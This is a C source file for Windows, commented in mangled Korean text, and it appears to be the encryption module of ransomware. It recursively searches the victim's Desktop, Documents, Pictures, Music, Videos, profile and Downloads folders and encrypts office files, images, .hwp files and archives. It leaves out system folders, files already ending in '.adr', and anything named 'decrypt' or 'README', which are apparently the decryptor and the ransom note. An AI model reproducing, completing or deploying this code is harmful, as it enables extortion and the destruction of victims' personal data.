#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>
#include <initguid.h>
#include <knownfolders.h>
#include "encryptor.h"
#include <shlwapi.h>                 
#pragma comment(lib, "Shlwapi.lib") 
#pragma comment(lib, "Shell32.lib")

// ��ȣȭ ��� Ȯ����
const char* extList[] = {
    ".txt", ".docx", ".xlsx", ".pdf", ".jpg", ".png", ".hwp", ".zip", ".pptx"
};

// �ý��� ��� ����
int is_system_path(const char* path) {
    return (
        StrStrIA(path, "\\Windows\\") ||
        StrStrIA(path, "\\Program Files\\") ||
        StrStrIA(path, "\\Program Files (x86)\\") ||
        StrStrIA(path, "\\Microsoft\\") ||
        StrStrIA(path, "\\AppData\\")
        );
}

// ��ȣȭ ���� ����
int should_skip_file(const char* filename) {
    if (StrStrIA(filename, ".adr")) return 1;  // �̹� ��ȣȭ�� ����
    if (StrStrIA(filename, "decrypt") || StrStrIA(filename, "README")) return 1;  // ��ȣȭ�⳪ ��Ʈ
    return 0;
}

// Ȯ���� üũ
int is_target_file(const char* filename) {
    const char* ext = strrchr(filename, '.');
    if (!ext) return 0;
    for (int i = 0; i < sizeof(extList) / sizeof(extList[0]); i++) {
        if (_stricmp(ext, extList[i]) == 0) return 1;
    }
    return 0;
}

// ����� ���丮 Ž�� �� ��ȣȭ
void scan_directory(const char* dir, const unsigned char* key, const unsigned char* iv) {
    if (is_system_path(dir)) {
        printf("[SKIP_SYS] %s\n", dir);
        return;
    }

    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, MAX_PATH, "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_directory(fullpath, key, iv);
        }
        else {
            if (should_skip_file(fullpath)) {
                printf("[SKIP] ��ȣȭ ���� ���: %s\n", fullpath);
                continue;
            }

            if (is_target_file(fd.cFileName)) {
                printf("[ENCRYPT] %s\n", fullpath);
                encrypt_file(fullpath, key, iv);
            }
            else {
                printf("[PASS] Ȯ���� �̴��: %s\n", fullpath);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

// Downloads ����
void scan_downloads(const unsigned char* key, const unsigned char* iv) {
    PWSTR wpath = NULL;
    if (SHGetKnownFolderPath(&FOLDERID_Downloads, 0, NULL, &wpath) == S_OK) {
        char path[MAX_PATH];
        wcstombs(path, wpath, MAX_PATH);
        printf("[MAIN] Ž�� ����: Downloads -> %s\n", path);
        scan_directory(path, key, iv);
        CoTaskMemFree(wpath);
    }
    else {
        printf("[ERROR] Downloads ��� ȹ�� ����\n");
    }
}

int main() {
    CoInitialize(NULL);  // COM �ʱ�ȭ

    unsigned char key[32], iv[16];
    restore_key(key);
    restore_iv(iv);

    const int folders[] = {
        CSIDL_DESKTOP,
        CSIDL_PERSONAL,
        CSIDL_MYPICTURES,
        CSIDL_MYMUSIC,
        CSIDL_MYVIDEO,
        CSIDL_PROFILE
    };

    char path[MAX_PATH];
    for (int i = 0; i < sizeof(folders) / sizeof(folders[0]); i++) {
        if (SHGetFolderPathA(NULL, folders[i], NULL, 0, path) == S_OK) {
            printf("[MAIN] Ž�� ����: %s\n", path);
            scan_directory(path, key, iv);
        }
    }

    // Downloads �߰�
    scan_downloads(key, iv);

    // ���� ����
    GetCurrentDirectoryA(MAX_PATH, path);
    printf("[MAIN] ���� ���� Ž��: %s\n", path);
    scan_directory(path, key, iv);

    printf("\n[INFO] Ž�� �� ��ȣȭ �Ϸ�.\n");
    getchar();
    return 0;
}
